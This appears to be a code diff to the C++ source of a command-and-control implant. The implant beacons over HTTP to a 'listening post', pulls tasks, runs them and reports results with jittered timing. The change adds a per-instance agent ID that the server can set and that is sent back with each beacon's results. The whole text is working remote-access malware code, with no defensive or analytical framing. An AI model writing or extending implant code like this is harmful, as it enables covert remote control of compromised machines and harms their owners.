@@ -71,6 +71,7 @@ Implant::Implant(std::string host, std::string port, std::string uri) :
     // Options for configuration settings
     isRunning{ true },
     dwellDistributionSeconds{ 1. },
+    agent_id{ "MA==" },
     // Thread that runs all our tasks, performs asynchronous I/O
     taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
 }
@@ -85,6 +86,10 @@ void Implant::setMeanDwell(double meanDwell) {
     // Exponential_distribution allows random jitter generation
     dwellDistributionSeconds = std::exponential_distribution<double>(2. / meanDwell);
 }
+
+
+// Method to set a unique agent id for each instance of the implant
+void Implant::setAgentID(std::string agentID) { agent_id = agentID; }
 
 
 // Method to start beaconing to the listening post
@@ -124,6 +129,7 @@ void Implant::beacon() {
     }
     // Format result contents
     std::stringstream resultsStringStream;
+    resultsLocal.add("agent_id", agent_id);
     boost::property_tree::write_json(resultsStringStream, resultsLocal);
     // Contact listening post with results and return any tasks received
     return sendHttpRequest(host, port, uri, resultsStringStream.str());
@@ -147,7 +153,8 @@ void Implant::parseTasks(const std::string& response) {
             tasks.push_back(
                 parseTaskFrom(taskTreeValue, [this](const auto& configuration) {
                     setMeanDwell(configuration.meanDwell);
-                    setRunning(configuration.isRunning); })
+                    setRunning(configuration.isRunning);
+                    setAgentID(configuration.agent_id); })
             );
         }
     }
@@ -167,7 +174,7 @@ void Implant::serviceTasks() {
         // Range based for-loop to call the run() method on each task and add the results of tasks
         for (const auto& task : localTasks) {
             // Call run() on each task and we'll get back values for id, contents and success
-            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
+            const auto [id, agent_id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
             // Scoped lock to add task results
             {
                 std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
